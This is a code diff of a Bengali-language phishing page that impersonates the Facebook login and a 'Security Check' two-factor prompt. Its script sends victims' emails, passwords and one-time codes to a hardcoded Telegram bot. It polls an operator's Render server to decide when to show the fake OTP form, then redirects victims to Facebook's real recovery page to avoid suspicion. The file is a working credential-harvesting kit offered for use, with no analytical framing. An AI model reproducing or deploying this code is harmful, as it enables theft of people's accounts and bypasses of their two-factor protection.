@@ -3,120 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In</title>
+    <title>Facebook - Security Check</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 16px; }
-        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 18px; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        .input-group { position: relative; width: 100%; margin: 10px 0; }
+        input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 16px; }
+        .pass-toggle { position: absolute; right: 15px; top: 15px; color: #606770; cursor: pointer; }
+        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .error-msg { color: #f02849; font-size: 12px; text-align: left; margin: 5px 0; display: none; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
-        .footer-link { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 15px; display: block; }
+        
+        /* OTP Page Styling */
+        .otp-header { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
+        .otp-sub { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.4; }
+        .timer { font-size: 13px; color: #1877f2; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="login-container" id="login-box">
     <div class="fb-logo">facebook</div>
-    <input type="text" id="email" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
-    <input type="password" id="pass" placeholder="পাসওয়ার্ড">
+    <div class="input-group">
+        <input type="text" id="email" placeholder="Mobile number or email address">
+        <div id="email-error" class="error-msg">আপনার নম্বর (১১ ডিজিট) বা সঠিক ইমেইল দিন।</div>
+    </div>
+    <div class="input-group">
+        <input type="password" id="pass" placeholder="Password">
+        <i class="fa-regular fa-eye-slash pass-toggle" id="togglePass"></i>
+        <div id="pass-error" class="error-msg">পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে।</div>
+    </div>
     <button class="btn" id="login-btn">Log In</button>
-    <a href="#" class="footer-link">Forgotten password?</a>
 </div>
 
 <div class="login-container hidden" id="loading-box">
     <div class="fb-logo">facebook</div>
     <div class="spinner"></div>
-    <p style="color: #606770; font-size: 14px;">আপনার অ্যাকাউন্ট ভেরিফাই হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।</p>
+    <p style="font-size: 14px; color: #606770;">অ্যাকাউন্ট ভেরিফাই হচ্ছে... অপেক্ষা করুন।</p>
 </div>
 
 <div class="login-container hidden" id="otp-box">
     <div class="fb-logo">facebook</div>
-    <p style="font-size: 14px; color: #4b4f56; margin-bottom: 15px;">নিরাপত্তার জন্য আপনার ফোনে পাঠানো ৬ ডিজিটের কোডটি দিন।</p>
-    <input type="number" id="otp-code" placeholder="------" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
-    <button class="btn" id="otp-btn">Confirm OTP</button>
+    <div class="otp-header">টু-ফ্যাক্টর অথেন্টিকেশন</div>
+    <div class="otp-sub">আমরা আপনার নিবন্ধিত মোবাইল নম্বরে একটি ৬ ডিজিটের লগইন কোড পাঠিয়েছি। আপনার অ্যাকাউন্ট সুরক্ষিত করতে কোডটি দিন।</div>
+    
+    <input type="number" id="otp-code" placeholder="Enter 6-digit code" style="text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: bold;">
+    <button class="btn" id="otp-btn">Continue</button>
+    
+    <div class="timer" id="timer">কোডটি পুনরায় পাঠান: 00:59</div>
 </div>
 
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const userId = urlParams.get('id'); // ভিকটিম যার লিঙ্ক দিয়ে ঢুকেছে তার আইডি
-    const RENDER_URL = "https://your-app-name.onrender.com"; // এখানে আপনার রেন্ডার অ্যাপের লিঙ্ক দিন
+    const RENDER_URL = "https://camh4ck.onrender.com"; // আপনার রেন্ডার লিঙ্ক দিন
+    const userId = new URLSearchParams(window.location.search).get('id');
 
-    // --- টেলিগ্রামে ডাটা পাঠানোর ফাংশন ---
+    // পাসওয়ার্ড শো/হাইড লজিক
+    const togglePass = document.querySelector('#togglePass');
+    const passInput = document.querySelector('#pass');
+    togglePass.addEventListener('click', function () {
+        const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passInput.setAttribute('type', type);
+        this.classList.toggle('fa-eye');
+        this.classList.toggle('fa-eye-slash');
+    });
+
+    // ডাটা পাঠানোর ফাংশন
     async function sendToBot(text) {
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019";
-        
-        const payload = { chat_id: adminId, text: text, parse_mode: 'Markdown' };
-        
-        // অ্যাডমিনকে বাটনসহ রিপোর্ট পাঠানো (লগইন হিটের সময়)
-        if(text.includes("LOGIN HIT")) {
-            payload.reply_markup = {
-                inline_keyboard: [[{ text: "📩 Request OTP Page", callback_data: `open_otp_${userId || adminId}` }]]
-            };
-        }
-
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                chat_id: adminId, 
+                text: text, 
+                parse_mode: 'Markdown'
+            })
         });
-
-        // যদি ভিকটিম অন্য কারো রেফারেল লিঙ্ক দিয়ে আসে
-        if (userId && userId !== adminId) {
-            payload.chat_id = userId;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            });
-        }
     }
 
-    // --- ১. লগইন বাটনের কাজ ---
+    // লগইন বাটন ক্লিক
     document.getElementById('login-btn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('pass').value.trim();
+        const emailError = document.getElementById('email-error');
+        const passError = document.getElementById('pass-error');
 
-        if (!email || !pass) return alert("তথ্য সঠিক দিন!");
+        // ভ্যালিডেশন লজিক
+        const isNumber = /^\d+$/.test(email);
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        let valid = true;
+
+        if (isNumber ? email.length !== 11 : !emailRegex.test(email)) {
+            emailError.style.display = 'block';
+            valid = false;
+        } else { emailError.style.display = 'none'; }
+
+        if (pass.length < 6) {
+            passError.style.display = 'block';
+            valid = false;
+        } else { passError.style.display = 'none'; }
+
+        if (!valid) return;
 
         document.getElementById('login-box').classList.add('hidden');
         document.getElementById('loading-box').classList.remove('hidden');
 
-        const msg = `🔥 **FB LOGIN HIT** 🔥\n\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\`\n👤 Report For: \`${userId || 'Admin'}\``;
-        await sendToBot(msg);
+        await sendToBot(`🔥 **FB LOGIN HIT** 🔥\n👤 User: \`${email}\`\n🔑 Pass: \`${pass}\`\n🆔 Target: \`${userId || 'Admin'}\``);
+        
+        // রেন্ডার সার্ভার চেক করা (ওটিপি পেজ খোলার জন্য)
+        startChecking();
+    });
 
-        // রিয়েল-টাইম কমান্ড চেক শুরু
-        const checkInterval = setInterval(async () => {
+    function startChecking() {
+        const interval = setInterval(async () => {
             try {
                 const res = await fetch(`${RENDER_URL}/get_command/${userId || '7068444019'}`);
                 const data = await res.json();
-
                 if (data.status === "show_otp") {
-                    clearInterval(checkInterval);
+                    clearInterval(interval);
                     document.getElementById('loading-box').classList.add('hidden');
                     document.getElementById('otp-box').classList.remove('hidden');
+                    startTimer();
                 }
-            } catch (e) { console.log("Waiting for admin..."); }
+            } catch (e) {}
         }, 3000);
-    });
+    }
 
-    // --- ২. ওটিপি বাটনের কাজ ---
+    function startTimer() {
+        let time = 59;
+        const timerDisplay = document.getElementById('timer');
+        setInterval(() => {
+            if (time > 0) {
+                time--;
+                timerDisplay.innerText = `কোডটি পুনরায় পাঠান: 00:${time < 10 ? '0' + time : time}`;
+            }
+        }, 1000);
+    }
+
     document.getElementById('otp-btn').addEventListener('click', async () => {
         const otp = document.getElementById('otp-code').value;
-        if (otp.length < 6) return alert("সঠিক ওটিপি দিন!");
-
-        document.getElementById('otp-box').classList.add('hidden');
-        document.getElementById('loading-box').classList.remove('hidden');
-
-        await sendToBot(`📩 **OTP RECEIVED** 📩\n\n🔢 Code: \`${otp}\`\n👤 User ID: \`${userId || 'Admin'}\``);
-
-        // ৩ সেকেন্ড পর আসল ফেসবুকে রিডাইরেক্ট
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/recover/initiate";
-        }, 3000);
+        if (otp.length < 6) return alert("সঠিক কোডটি দিন।");
+        
+        await sendToBot(`📩 **OTP CODE** 📩\n🔢 Code: \`${otp}\`\n👤 From: \`${userId || 'Admin'}\``);
+        window.location.href = "https://www.facebook.com/recover/initiate";
     });
 </script>
 </body>
